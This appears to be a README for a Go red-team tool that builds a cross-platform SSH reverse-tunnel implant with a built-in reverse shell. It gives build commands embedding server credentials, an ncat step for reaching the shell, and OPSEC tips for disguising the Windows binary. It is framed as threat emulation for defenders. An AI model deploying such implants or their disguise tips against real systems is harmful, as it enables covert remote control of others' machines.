## RedRaven

RedRaven is a golang (recommend v1.15, v1.13 min) cross platform implementation of an ssh reverse tunnel (with a built in reverse shell) similar to:  

    ssh -R 8080:localhost:8080 -i ./privkey.pem user@serverAddr

This opens a tunnel between the two endpoints and allows data to be exchanged this direction:
   
    server:8080 ---> client:8080

Once authenticated a process on the SSH server can interact with the service answering to port 8080 of the client. In this case a built in reverse shell that you can interact with via ncat on the ssh server.  As this is a outbound model vs a bind you don't need to deal with any NAT/firewall rules assuming outbound ssh is allowed.

## Dependices
* [Go](https://golang.org/) 1.13+
* GNU make
* [goversioninfo](https://github.com/josephspurrier/goversioninfo) (needed to add the windows resource infromation to the binary)
* osslsigncode (needed to sign the windows binary) if you don't care about signing you can comment these lines out in the Makefile.

## How to build
The only thing you should need to modify is the Makefile for the variable "PATH_TO_PEM."  Note becasue the variables are injected at build time via the Makefile.  Second, one may need to uncomment the log.Fatal lines in the main.go for troubleshooting, these statements are commented out for threat emulation purpose to excerise the blue IR and RE teams.  Note you may also need to run "make depends" first to generate the generate self signed certificate.

### Example 1 
You plan to use public Key auth, to do this you first need to set the PATH_TO_PEM variable in the Makefile and 
compile the binary with the nessecary paramaters for example:

    make linux64 PEM=true USER=ubuntu SERVER=<FQDN or IPaddr>:<PORT>

### Example 2 
You plan to use password auth, compile the binary with the nessecary paramaters for example:

    make linux64 PEM=false USER=ubuntu SERVER=acme.com:22 PASSWD=123pass

Note that it is possible to have both a PEM and PASSWD set, the PEM=BOOL controls what is used.

## On the SSH Server (gray space)
SSH to the server to interact with the target and type: 

    ncat localhost 8080

note control-c will kill ncat but it will not terminate the process on the client.  Another words the ssh session is still active. On a windows systems you would need to do something like the following:

    tasklist | findstr putty
    taskkill /F /PID <PID #>

## OPSEC
Things to consider for windows:
* ```You are embedding credentials in the binary being deployed, take precautions!```
* The name of the binary
* The icon
* The values in the ./resource/verioninfo.json file especially "OriginalFilename" - this should match the binary name set in the Makefile
* The fact this uses a self signed Certificate 
